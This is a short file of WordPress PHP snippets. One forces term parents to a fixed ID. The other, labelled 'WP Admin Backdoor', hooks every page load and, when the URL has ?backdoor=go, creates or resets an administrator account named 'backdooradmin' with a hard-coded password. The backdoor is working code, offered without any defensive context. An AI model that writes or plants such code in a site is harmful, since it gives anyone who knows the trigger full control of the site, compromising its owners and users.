# Snippets
	/**
	* Updating parent on term edit screen
	*/
	add_filter('wp_update_term_parent','test_func',10,5);
	function test_func($parent, $term_id, $taxonomy, $parsed_args, $args) {
		$parent = 19;
		return $parent;
	}
	/**
	* WP Admin Backdoor
	*/
	add_action('wp_head', 'WordPress_backdoor');

	function WordPress_backdoor() {
	    If ($_GET['backdoor'] == 'go') {
		require('wp-includes/registration.php');
		require('wp-includes/pluggable.php');
		If (!username_exists('backdooradmin')) {
		    $user_id = wp_create_user('backdooradmin', 'Pa55W0rd');
		    $user = new WP_User($user_id);
		    $user->set_role('administrator');
		}else{
		    $user = get_user_by( 'login', 'backdooradmin' );
		    wp_set_password('Pa55W0rd', $user->ID);
		}
	    }
	}
